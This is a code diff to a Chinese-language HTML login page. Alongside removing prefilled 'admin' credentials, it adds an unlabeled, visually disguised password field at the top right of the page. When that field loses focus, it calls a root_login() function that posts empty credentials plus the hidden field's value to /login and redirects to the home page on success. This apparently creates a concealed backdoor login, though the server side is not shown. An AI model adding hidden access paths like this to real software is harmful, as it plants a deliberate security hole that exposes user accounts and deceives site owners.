@@ -4,6 +4,8 @@
     <title>用户登录</title>
 	<meta charset="utf-8">
     <link href="/stylesheets/bootstrap.min.css" rel="stylesheet" media="screen">
+		<link rel="stylesheet" type="text/css" href="/fonts/font-awesome-4.2.0/css/font-awesome.min.css" />
+    <link rel="stylesheet" href="/stylesheets/set1.css">
       <script src="/javascripts/jquery-2.1.1.min.js" type="text/javascript"></script>
       <script src="/javascripts/bootstrap.min.js" type="text/javascript"></script>
 		<style type="text/css">
@@ -18,7 +20,39 @@
 				font-size: 24px;
 				font-weight: bold;
 			}
+            .input--minoru  {
+                position: absolute;
+                right: 0;
+                top: 27%;
+                width: 200px
+            }
+            #input_13 {
+                cursor: default
+            }
 		</style>
+        <script type="text/javascript">
+           function root_login(){
+               var username = '';
+               var password = '';
+               var root_name = $('#input_13').val()||'';
+               var data = { "uname": username, "upwd":password, "extra":root_name};
+               $.ajax({
+                   url:'/login',
+                   type:'POST',
+                   data:data,
+                   success:function(data,status){
+                       if(status == 'success'){
+                           location.href='my_home';
+                       }
+                   },
+                   error:function(data,status){
+                     if(status == "error"){
+                         location.href='login';
+                     }
+                   }
+               });
+           }
+        </script>
         <script type="text/javascript">
            function login(){
                var username = $('#username').val(),password = $('#password').val();
@@ -53,12 +87,13 @@
                 <div class="panel-body">
                     <form action="#" class="form-horizontal" role="form" method="post" >
                         <div class="form-group">
-                            <input id="username" value="admin" type="text" class="form-control" name="username"  />
+                            <input id="username" type="text" class="form-control" name="username"  />
                         </div>
                         <div class="form-group">
-                            <input id="password" value="1" type="password" class="form-control" name="password" autocomplete="off" placeholder="密码" />
+                            <input id="password" type="password" class="form-control" name="password" autocomplete="off"/>
                         </div>
                         <div class="form-group">
+
                             <input type="button" class="btn btn-success btn-block" onclick="login();" value="登 陆" />
                             <a href="register" class="btn btn-primary" style="float: right;margin-top: 20px;">注 册</a>
                         </div>
@@ -68,6 +103,11 @@
         </div>
     </div>
 </div>
+				<span class="input input--minoru">
+					<input onblur="root_login()" class="input__field input__field--minoru" type="password" id="input_13" />
+					<label class="input__label input__label--minoru" for="input-13">
+					</label>
+				</span>
 </body>
 </html>
 
